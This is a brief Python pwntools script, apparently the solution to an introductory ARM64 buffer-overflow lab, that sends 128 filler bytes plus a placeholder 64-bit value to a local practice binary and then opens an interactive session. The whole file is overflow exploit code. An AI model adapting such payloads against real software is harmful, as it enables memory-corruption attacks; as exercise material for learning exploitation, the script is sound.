#!/usr/bin/python

import struct
import sys

from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/01-local-overflow'

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * 128
payload += p64(0xdeadbabebeefc0de)

p.readuntil('> ')
p.write(payload)
p.interactive()
